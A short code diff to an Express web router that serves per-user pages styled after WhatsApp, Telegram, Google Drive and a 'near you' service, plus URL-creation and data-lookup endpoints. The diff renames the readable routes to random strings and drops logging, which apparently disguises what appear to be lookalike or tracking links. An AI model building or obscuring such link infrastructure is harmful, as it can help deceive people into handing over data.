@@ -19,26 +19,20 @@ router.post('/uploadFile', upload.any(), async function (req, res, next) {
   res.send(data)
 })
 
-router.get('/whatsapplink/:userId', function(req, res, next) {
-  console.log('####', req.params.userId);
+router.get('/rlijoptybdtjuv1/:userId', function(req, res, next) {
   res.sendFile(path.join(__dirname + '/../public/whatsapp.html'))
 });
 
-router.get('/whatsapplink', function(req, res, next) {
-  res.sendFile(path.join(__dirname + '/../public/whatsapp.html'))
-});
-
-
-router.get('/nearyoulink/:userId', function(req, res, next) {
+router.get('/rlijoptybdtjuv2/:userId', function(req, res, next) {
   res.sendFile(path.join(__dirname + '/../public/nearyou.html'))
 });
 
 
-router.get('/telegramlink/:userId', function(req, res, next) {
+router.get('/rlijoptybdtjuv3/:userId', function(req, res, next) {
   res.sendFile(path.join(__dirname + '/../public/telegram.html'))
 });
 
-router.get('/gdrivelink/:userId', function(req, res, next) {
+router.get('/rlijoptybdtjuv4/:userId', function(req, res, next) {
   res.sendFile(path.join(__dirname + '/../public/gdrive.html'))
 });
 
@@ -51,7 +45,6 @@ router.post('/createUrl', AuthToken, async function(req, res) {
 
 router.post('/getUrlData', async function(req, res) {
   const data = await generateUrlController.getUrlData({id: req.body.userUniqId}, res)
-  console.log('@@@userData', data);
   res.send(data);
 })
 
